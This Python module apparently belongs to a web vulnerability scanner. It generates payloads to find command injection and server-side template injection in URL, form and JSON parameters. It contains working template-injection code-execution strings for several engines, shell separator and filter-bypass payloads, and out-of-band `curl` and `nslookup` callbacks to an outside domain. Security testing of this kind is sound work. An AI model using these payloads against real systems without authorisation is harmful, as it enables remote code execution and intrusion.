from __future__ import annotations

import random
import re
import string
import urllib.parse

SYNTAXES = [
    ("raw", "{c}"),
    ("semicolon", "; {c} ;"),
    ("pipe", "| {c}"),
    ("pipe2", "|| {c}"),
    ("and", "&& {c}"),
    ("subshell", "$({c})"),
    ("backtick", "`{c}`"),
    ("newline", "\n{c}"),
    ("quote_escape", "' ; {c} ; '"),
    ("dquote_escape", "\" ; {c} ; \""),
]

ECHO_SYNTAXES = [
    ("raw", "{c}"),
    ("semicolon", "; {c} ;"),
    ("pipe", "| {c}"),
    ("pipe2", "|| {c}"),
    ("and", "&& {c}"),
    ("subshell", "$({c})"),
    ("backtick", "`{c}`"),
    ("quote_escape", "' ; {c} ; '"),
    ("dquote_escape", "\" ; {c} ; \""),
]

BYPASS_SYNTAXES = [
    ("newline_bypass", "%0a{c}"),
    ("or_chain_bypass", "||{c}"),
    ("and_chain_bypass", "&&{c}"),
    ("double_and", "&&&{c}"),
    ("subshell_bypass", "$({c})"),
    ("backtick_bypass", "`{c}`"),
]

IMPACT_PAYLOADS_UNIX = ["; id ;", "| id", "$(id)", "`id`", "\nid", "&& id", "|| id"]
IMPACT_PAYLOADS_WINDOWS = ["& whoami", "| whoami", "&& whoami", "\r\nwhoami"]

UID_REGEX = r"uid=\d+\(([^)]*)\)"
WHOAMI_WINDOWS_HINT = re.compile(r"^[a-z0-9_.-]+\\[a-z0-9_.-]+$", re.IGNORECASE | re.MULTILINE)

SSTI_RCE_PROOF = re.compile(r"uid=\d+\([^)]*\)")

ENGINE_FINGERPRINTS = [
    ("jinja2_or_twig", "{{@N1@*@N2@}}"),
    ("freemarker", "${@N1@*@N2@}"),
    ("freemarker_hash", "#{@N1@*@N2@}"),
    ("erb", "<%= @N1@*@N2@ %>"),
    ("thymeleaf", "*{{@N1@*@N2@}}"),
    ("thymeleaf_inline", "[[${@N1@*@N2@}]]"),
    ("velocity", "#set($r=@N1@*@N2@)${r}"),
    ("mako", "${@N1@*@N2@}"),
]

SSTI_JINJA_TWIG_DIFF = "{{7*'7'}}"

SSTI_RCE_PAYLOADS = {
    "jinja2": [
        "{{ lipsum.__globals__['os'].popen('id').read() }}",
        "{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}",
        "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
    ],
    "erb": [
        "<%= `id` %>",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
        "${self.module.cache.util.os.popen('id').read()}",
        "${self.template.module.runtime.util.os.popen('id').read()}",
    ],
    "velocity": [
        "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")",
    ],
    "thymeleaf": [
        "*{T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
}

SSTI_ENGINE_BY_FINGERPRINT = {
    "jinja2_or_twig": None,
    "freemarker": "freemarker",
    "freemarker_hash": "freemarker",
    "erb": "erb",
    "thymeleaf": "thymeleaf",
    "thymeleaf_inline": "thymeleaf",
    "velocity": "velocity",
    "mako": "mako",
}


def ssti_numbers() -> tuple[int, int, int]:
    n1 = random.randint(11, 79)
    n2 = random.randint(11, 79)
    return n1, n2, n1 * n2


def build_ssti_fingerprint_payloads() -> list[tuple[str, str, int]]:
    n1, n2, product = ssti_numbers()
    out = []
    for engine, tpl in ENGINE_FINGERPRINTS:
        out.append((engine, tpl.replace("@N1@", str(n1)).replace("@N2@", str(n2)), product))
    return out


def build_ssti_rce_payloads(engine: str) -> list[str]:
    return SSTI_RCE_PAYLOADS.get(engine, [])


def build_impact_payloads(os_type: str = "unix") -> list[str]:
    return IMPACT_PAYLOADS_WINDOWS if os_type == "windows" else IMPACT_PAYLOADS_UNIX


def build_oob_poll_check(client, poll_url: str, token: str, timeout: float = 10.0) -> bool:
    try:
        import requests as _r

        resp = _r.get(poll_url, timeout=timeout)
        return token in resp.text
    except Exception:
        return False


def random_token(prefix: str = "rh") -> str:
    body = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{body}"


def arithmetic_token() -> tuple[str, str]:
    n = random.randint(1111, 9999)
    return str(n), str(n * 2)


def build_arithmetic_payloads(n: str) -> list[str]:
    return [f"$(({n}*2))", f"$(expr {n} \\* 2)", f"`expr {n} \\* 2`"]


def build_echo_payloads() -> list[tuple[str, str]]:
    a, b = random_token("rha"), random_token("rhb")
    cmd = f"echo {a}$(echo {b})"
    payloads = []
    for name, tpl in ECHO_SYNTAXES:
        payloads.append((name, tpl.format(c=cmd)))
    return payloads, (a, b)


def build_time_payloads(delay: int) -> list[tuple[str, str]]:
    cmd = f"sleep {delay}"
    payloads = []
    for name, tpl in SYNTAXES:
        payloads.append((name, tpl.format(c=cmd)))
    return payloads


def build_oob_payloads(domain: str, token: str) -> list[tuple[str, str]]:
    cmd = f"nslookup {token}.{domain}"
    alt = f"curl -s http://{token}.{domain}"
    payloads = []
    for name, tpl in ECHO_SYNTAXES:
        payloads.append((name, tpl.format(c=cmd)))
        payloads.append((name + "_curl", tpl.format(c=alt)))
    return payloads


def encode_for_url(payload: str, url_encode: bool = True) -> str:
    if not url_encode:
        return payload
    return urllib.parse.quote(payload, safe="")


def split_injection_points(url: str, data: str | None, params: str | None) -> list[dict]:
    points = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    for key, values in qs.items():
        for v in values:
            points.append({"kind": "query", "name": key, "original": v})
    if params:
        for part in params.split("&"):
            if "=" in part:
                k, v = part.split("=", 1)
                points.append({"kind": "body", "name": k, "original": v})
            elif part:
                points.append({"kind": "body", "name": part, "original": ""})
    if data:
        if _looks_like_json(data):
            points.extend(_json_points(data))
        else:
            for part in data.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    points.append({"kind": "body", "name": k, "original": v})
                elif part:
                    points.append({"kind": "body", "name": part, "original": ""})
    return points


def _looks_like_json(data: str) -> bool:
    s = data.strip()
    return s.startswith("{") and s.endswith("}") or s.startswith("[") and s.endswith("]")


def _json_points(data: str) -> list[dict]:
    import json

    points = []
    try:
        obj = json.loads(data)
    except (ValueError, TypeError):
        return points
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, str):
                points.append({"kind": "json", "name": k, "original": v})
    return points


def inject(original_url: str, point: dict, raw_payload: str, url_encode: bool = True) -> str:
    parsed = urllib.parse.urlparse(original_url)
    enc = urllib.parse.quote(raw_payload, safe="") if url_encode else raw_payload
    if point["kind"] == "query":
        qs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
        new_qs = [(k, enc if k == point["name"] and v == point["original"] else v) for k, v in qs]
        return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_qs)))
    return original_url
